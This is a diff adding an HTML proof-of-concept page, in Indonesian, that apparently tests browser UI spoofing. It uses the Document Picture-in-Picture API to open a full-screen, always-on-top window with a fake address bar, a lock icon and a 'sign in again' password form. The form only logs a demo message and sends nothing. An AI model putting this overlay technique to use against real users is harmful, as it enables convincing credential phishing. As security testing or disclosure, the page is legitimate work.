@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Dokumen Dibagikan</title>
+<style>
+ body{font-family:Arial;padding:40px;background:#f5f7fb;max-width:640px;margin:0 auto;text-align:center;}
+ button{padding:14px 28px;font-size:17px;cursor:pointer;background:#1a73e8;color:#fff;border:none;border-radius:6px;}
+ #log{position:fixed;bottom:0;left:0;right:0;background:#fff7cc;font-family:monospace;font-size:11px;max-height:200px;overflow:auto;padding:6px;border-top:2px solid #cc0;text-align:left;}
+</style>
+</head>
+<body>
+<h1>Dokumen Dibagikan Untuk Anda (v2 - Document PiP)</h1>
+<p>Satu file, satu klik. Kali ini pakai Document Picture-in-Picture API (selalu di atas, tanpa address bar).</p>
+<button id="view">Lihat Dokumen</button>
+<div id="log"></div>
+
+<script>
+function log(m){
+  const el=document.getElementById('log');
+  const l=document.createElement('div');
+  l.textContent=new Date().toISOString()+' '+m;
+  el.appendChild(l);
+  el.scrollTop=el.scrollHeight;
+}
+
+document.getElementById('view').addEventListener('click', async () => {
+  if (!('documentPictureInPicture' in window)) {
+    log('documentPictureInPicture API TIDAK TERSEDIA di browser ini');
+    return;
+  }
+
+  log('API tersedia. screen.availWidth=' + screen.availWidth + ' availHeight=' + screen.availHeight);
+
+  let pipWindow;
+  try {
+    pipWindow = await window.documentPictureInPicture.requestWindow({
+      width: screen.availWidth,
+      height: screen.availHeight
+    });
+    log('requestWindow() RESOLVED. pipWindow.innerWidth=' + pipWindow.innerWidth + ' innerHeight=' + pipWindow.innerHeight);
+  } catch (e) {
+    log('requestWindow() GAGAL: ' + e);
+    return;
+  }
+
+  const style = pipWindow.document.createElement('style');
+  style.textContent = `
+    html,body{margin:0;height:100%;font-family:Arial;background:#fff;}
+    .fakebar{height:36px;background:#e8eaed;display:flex;align-items:center;padding:0 10px;font-size:13px;color:#3c4043;box-shadow:0 1px 3px rgba(0,0,0,.2);}
+    .fakebar .lock{color:#1a73e8;margin-right:6px;}
+    .fakebody{padding:40px;}
+    input{width:320px;padding:8px;margin:6px 0;box-sizing:border-box;display:block;}
+    #piplog{position:fixed;bottom:0;left:0;right:0;background:#fff7cc;font-family:monospace;font-size:10px;max-height:100px;overflow:auto;padding:4px;border-top:2px solid #cc0;}
+  `;
+  pipWindow.document.head.appendChild(style);
+
+  const bar = pipWindow.document.createElement('div');
+  bar.className = 'fakebar';
+  bar.innerHTML = '<span class="lock">&#128274;</span>https://accounts.example-login-demo.test/oauth';
+  pipWindow.document.body.appendChild(bar);
+
+  const body = pipWindow.document.createElement('div');
+  body.className = 'fakebody';
+  body.innerHTML = '<h2>Sesi berakhir, masuk lagi</h2>' +
+    '<input placeholder="Email">' +
+    '<input placeholder="Password" type="password">' +
+    '<button id="pipgo">Lanjutkan</button>';
+  pipWindow.document.body.appendChild(body);
+
+  const piplog = pipWindow.document.createElement('div');
+  piplog.id = 'piplog';
+  pipWindow.document.body.appendChild(piplog);
+  function plog(m){
+    const l = pipWindow.document.createElement('div');
+    l.textContent = new Date().toISOString() + ' ' + m;
+    piplog.appendChild(l);
+  }
+  plog('pip window loaded, innerWidth=' + pipWindow.innerWidth + ' innerHeight=' + pipWindow.innerHeight);
+
+  pipWindow.document.getElementById('pipgo').addEventListener('click', (e) => {
+    e.preventDefault();
+    plog('[DEMO] sign-in diklik, tidak ada data terkirim ke mana pun');
+  });
+
+  log('fake chrome UI dipasang di dalam PiP window. Cek apakah PiP window menutupi layar & selalu di atas jendela Brave.');
+});
+</script>
+</body>
+</html>
